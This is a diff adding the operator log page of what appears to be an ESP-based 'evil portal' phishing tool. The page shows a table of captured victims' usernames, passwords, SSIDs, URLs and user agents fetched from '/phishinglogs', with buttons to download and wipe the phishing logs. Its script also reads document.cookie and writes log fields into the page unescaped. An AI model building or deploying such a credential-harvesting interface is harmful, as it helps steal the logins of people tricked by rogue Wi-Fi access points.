@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <meta name="viewport" content="width=device-width, initial-scale=0.8, minimal-ui">
+    <title>ESP PORTAL</title>
+    <link rel="stylesheet" href="/milligram.min.css">
+    <link rel="stylesheet" href="/normalize.min.css">
+    <link rel="stylesheet" href="/main.css">
+    <script src="/jquery.slim.min.js"></script>
+    <script src="/main.js"></script>
+  </head>
+  <body>
+    <main class="wrapper">
+      <nav class="navigation">
+        <section class="container">
+          <div class="navigation-title"><a href="/espportal" class="button">Home</a></div>
+          <div class="float-right navigation-title">ESPORTAL</div>
+        </section>
+      </nav>
+      <section class="container">
+        <div class="row">
+          <div class="column">
+            <h1>View logs</h1><br>
+            <div class="row">
+              <div class="column">
+                <h4>Connected stations</h4>
+                <div style="overflow-x: scroll;">
+                  <table>
+                    <thead>
+                      <tr>
+                        <th>url</th>      
+                        <th>ssid</th>      
+                        <th>channel</th>      
+                        <th>user</th>      
+                        <th>pass</th>      
+                        <th>userAgent</th>
+                      </tr>
+                    </thead>  
+                    <tbody id="phishingTable"></tbody>
+                  </table>
+                </div>
+              </div>
+            </div><a href="/download_phish_logs" class="button">Download logs</a> <a href="/wipe_physh_logs" class="button button-outline">Wipe logs</a>
+          </div>
+        </div>
+      </section>
+    </main>
+  </body>
+</html>
+<script>
+  function loadJson(){
+    getFile("/phishinglogs",function(res){
+      
+      var usercookie = document.cookie;
+      var arr = JSON.parse(res);
+      console.log(arr);
+      arr.forEach(function(json) {
+        console.log(json);
+        $("#phishingTable").append('<tr><td>'+json.url+'</td><td>'+json.ssid+'</td><td>'+json.channel+'</td><td>'+json.user+'</td><td>'+json.pass+'</td><td>'+json.userAgent+'</td></tr>');
+      });
+    });
+  
+  }
+  
+  
+  
+  
+  
+</script>
+<script>
+  $(document).ready(function() {
+  
+    loadJson();
+        
+  });
+</script>
